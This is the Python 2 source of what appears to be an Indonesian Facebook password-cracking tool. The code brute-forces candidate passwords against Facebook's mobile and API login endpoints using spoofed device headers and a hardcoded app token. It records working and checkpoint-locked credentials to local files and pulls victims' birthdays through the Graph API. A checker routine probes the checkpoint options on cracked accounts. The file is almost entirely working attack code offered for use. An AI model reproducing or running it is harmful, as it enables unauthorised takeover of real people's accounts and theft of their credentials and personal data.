        headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': ua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
        send = ses.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers_)
        if 'session_key' in send.text and 'EAAA' in send.text:
            print '\r \x1b[0;32m[\x1b[0;97m=\x1b[0;32m]\x1b[0;92m %s|%s|%s\x1b[0;97m' % (uid, pw, send.json()['access_token'])
            ok.append('%s|%s' % (uid, pw))
            open('OK/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
            break
        elif 'www.facebook.com' in send.json()['error_msg']:
            try:
                token = open('login.txt', 'r').read()
                with requests.Session() as (ses):
                    ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                    month, day, year = ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;33m %s|%s|%s %s %s\x1b[0;37m' % (uid, pw, day, month, year)
                    cp.append('%s|%s' % (uid, pw))
                    open('CP/%s.txt' % tanggal, 'a').write('%s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                    break
            except (KeyError, IOError):
                day = ' '
                month = ' '
                year = ' '
            except:
                pass

            print '\r \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;33m %s|%s\x1b[0;37m        ' % (uid, pw)
            cp.append('%s|%s' % (uid, pw))
            open('CP/%s.txt' % tanggal, 'a').write('%s|%s\n' % (uid, pw))
            break
        else:
            continue

    loop += 1


def crack(uid, pwx, host, **kwargs):
    global loop
    global token
    try:
        ua = open('.ua', 'r').read()
    except IOError:
        ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'

    sys.stdout.write('\r \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;37m crack\x1b[0;32m %s/%s\x1b[0;37m OK:\x1b[0;32m-%s\x1b[0;37m - CP:\x1b[0;33m-%s ' % (loop, len(id), len(ok), len(cp)))
    sys.stdout.flush()
    try:
        for pw in pwx:
            kwargs = {}
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({'origin': host, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', host)), 'referer': host + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'})
            p = ses.get(host + '/login/?next&ref=dbl&refid=8').text
            b = parser(p, 'html.parser')
            bl = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login']
            for i in b('input'):
                try:
                    if i.get('name') in bl:
                        kwargs.update({i.get('name'): i.get('value')})
                    else:
                        continue
                except:
                    pass

            kwargs.update({'email': uid, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', '_fb_noscript': 'true'})
            gaaa = ses.post(host + '/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8', data=kwargs)
            if 'c_user' in ses.cookies.get_dict().keys():
                kuki = (';').join([ '%s=%s' % (key, value) for key, value in ses.cookies.get_dict().items() ]).replace('noscript=1;', '')
                print '\r \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;32m %s|%s|%s\x1b[0;37m' % (uid, pw, send.json()['access_token'])
                ok.append('%s|%s' % (uid, pw))
                open('OK/%s.txt' % tanggal, 'a').write('  * --> %s|%s\n' % (uid, pw))
                break
            elif 'checkpoint' in ses.cookies.get_dict().keys():
                try:
                    token = open('login.txt', 'r').read()
                    with requests.Session() as (ses):
                        ttl = ses.get('https://graph.facebook.com/%s?access_token=%s' % (uid, token)).json()['birthday']
                        month, day, year = ttl.split('/')
                        month = bulan_ttl[month]
                        print '\r \x1b[0;37m[\x1b[0;37m=\x1b[0;37m]\x1b[0;33m %s|%s|%s %s %s\x1b[0;37m' % (uid, pw, day, month, year)
                        cp.append('%s|%s' % (uid, pw))
                        open('CP/%s.txt' % tanggal, 'a').write('%s|%s|%s %s %s\n' % (uid, pw, day, month, year))
                        break
                except (KeyError, IOError):
                    day = ' '
                    month = ' '
                    year = ' '
                except:
                    pass

                print '\r \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;33m %s|%s\x1b[0;37m        ' % (uid, pw)
                cp.append('%s|%s' % (uid, pw))
                open('CP/%s.txt' % tanggal, 'a').write('%s|%s\n' % (uid, pw))
                break
            else:
                continue

        loop += 1
    except Exception as e:
        if 'free.facebook.com' in host:
            return crack(uid, pwx, host)
        else:
            return crack(uid, pwx, 'https://free.facebook.com')


def setting_ua():
    print h + '\n [' + pu + ' pilih user-agent hp anda ' + h + ']\n'
    print h + ' [' + pu + '1' + h + ']' + pu + ' Xiaomi'
    print h + ' [' + pu + '2' + h + ']' + pu + ' Samsung'
    print h + ' [' + pu + '3' + h + '] ' + pu + 'Nokia'
    print h + ' [' + pu + '4' + h + ']' + pu + ' Asus'
    print h + ' [' + pu + '5' + h + ']' + pu + ' Huawei'
    print h + ' [' + pu + '6' + h + ']' + pu + ' Oppo'
    print h + ' [' + pu + '7' + h + ']' + pu + ' U-A random'
    print h + ' [' + pu + '8' + h + ']' + pu + ' User-Agent Manual'
    ua = raw_input(h + '\n [' + pu + '=' + h + ']' + pu + ' pilih :' + h + ' ')
    if ua == '':
        menu()
    elif ua == '1':
        c_ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + h + ' [' + pu + '=' + h + '] ' + pu + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' berhasil ganti user agent')
        menu()
    elif ua == '2':
        c_ua = 'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + h + ' [' + pu + '=' + h + '] ' + pu + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' berhasil ganti user agent')
        menu()
    elif ua == '3':
        c_ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + h + ' [' + pu + '=' + h + '] ' + pu + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' berhasil ganti user agent')
        menu()
    elif ua == '4':
        c_ua = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + h + ' [' + pu + '=' + h + '] ' + pu + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' berhasil ganti user agent')
        menu()
    elif ua == '5':
        c_ua = '[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + h + ' [' + pu + '=' + h + '] ' + pu + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' berhasil ganti user agent')
        menu()
    elif ua == '6':
        c_ua = 'Mozilla/5.0 (Linux; Android 9; CPH1937) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + h + ' [' + pu + '=' + h + '] ' + pu + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' berhasil ganti user agent')
        menu()
    elif ua == '7':
        c_ua = ('Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]',
                '[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]',
                'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]',
                'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]',
                'Mozilla/5.0 (Linux; Android 10; Mi 5 Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]')
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        print '' + h + ' [' + pu + '=' + h + '] ' + pu + 'user-agent :' + h + ' %s' % open('.ua', 'r').read()
        raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' berhasil ganti user agent')
        menu()
    elif ua == '8':
        c_ua = raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' user agent : ' + h + ' ')
        if c_ua == '':
            exit('\n [!] jangan kosong')
        open('.ua', 'w').write(c_ua)
        time.sleep(1)
        raw_input('\n' + h + ' [' + pu + '=' + h + ']' + pu + ' berhasil ganti user agent')
        menu()
    else:
        menu()


def cek_opsi():
    print '\n ' + h + '[' + pu + '=' + h + ']' + pu + ' login via' + h + ' mbasic.facebook.com'
    print ' ' + h + '[' + pu + '=' + h + ']' + pu + ' masukan file (contoh: ' + h + 'CP/5-September.txt' + pu + ')'
    files = raw_input(' ' + h + '[' + pu + '=' + h + ']' + pu + ' nama file  :' + h + ' ')
    if files == '':
        menu()
    try:
        buka_baju = open(files, 'r').readlines()
    except IOError:
        exit('\n ! nama file %s tidak tersedia' % files)

    print h + ' [' + pu + '=' + h + ']' + pu + ' total akun : ' + str(len(buka_baju))
    print h + ' [' + pu + '=' + h + ']' + pu + ' sedang prosess cek akun....'
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid = kontol.split('|')
        print '\n ' + h + '[' + pu + '=' + h + ']' + pu + ' cek akun : \x1b[0;92m' + kontol.replace(' + ', '')
        try:
            check_in(titid[0].replace(' + ', ''), titid[1])
        except requests.exceptions.ConnectionError:
            pass

    raw_input('\n ' + h + '[' + pu + '=' + h + ']' + pu + ' klik enter untuk kembali ke menu....')
    menu()


def check_in(user, pasw):
    mb = 'https://x.facebook.com'
    ua = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
    ses = requests.Session()
    ses.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'origin': mb, 'content-type': 'application/x-www-form-urlencoded', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'referer': mb + '/login/?next&ref=dbl&fl&refid=8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
    data = {}
    ged = parser(ses.get(mb + '/login/?next&ref=dbl&fl&refid=8', headers={'user-agent': ua}).text, 'html.parser')
    fm = ged.find('form', {'method': 'post'})
    list = ['lsd', 'jazoest', 'm_ts', 'li', 'try_number', 'unrecognized_tries', 'login', 'bi_xrwh']
    for i in fm.find_all('input'):
        if i.get('name') in list:
            data.update({i.get('name'): i.get('value')})
        else:
            continue

    data.update({'email': user, 'pass': pasw})
    run = parser(ses.post(mb + fm.get('action'), data=data, allow_redirects=True).text, 'html.parser')
    if 'checkpoint' in ses.cookies:
        form = run.find('form')
        dtsg = form.find('input', {'name': 'fb_dtsg'})['value']
        jzst = form.find('input', {'name': 'jazoest'})['value']
        nh = form.find('input', {'name': 'nh'})['value']
        dataD = {'fb_dtsg': dtsg, 'fb_dtsg': dtsg, 'jazoest': jzst, 'jazoest': jzst, 'checkpoint_data': '', 'submit[Continue]': 'Lanjutkan', 'nh': nh}
        xnxx = parser(ses.post(mb + form['action'], data=dataD).text, 'html.parser')
        ngew = [ yy.text for yy in xnxx.find_all('option') ]
        print '\x1b[0;32m [\x1b[0;37m=\x1b[0;32m]\x1b[0;37m terdapat \x1b[0;32m' + str(len(ngew)) + '\x1b[0;37m opsi '
        for opt in range(len(ngew)):
            print ' \x1b[0;32m[\x1b[0;37m' + str(opt + 1) + '\x1b[0;32m]\x1b[0;37m ' + ngew[opt]

    elif 'login_error' in str(run):
        oh = run.find('div', {'id': 'login_error'}).find('div').text
        print ' \x1b[0;32m[\x1b[0;37m=\x1b[0;32m]\x1b[0;37m %s' % oh
    else:
        print '\x1b[0;32m [' + pu + '=' + h + ']' + pu + ' login gagal, silahkan cek kembali id dan password'


def main_coeg():
    os.system('git pull')
    os.system('touch login.txt')
    try:
        os.mkdir('CP')
    except:
        pass

    try:
        os.mkdir('OK')
    except:
        pass

    login()


if __name__ == '__main__':
    main_coeg()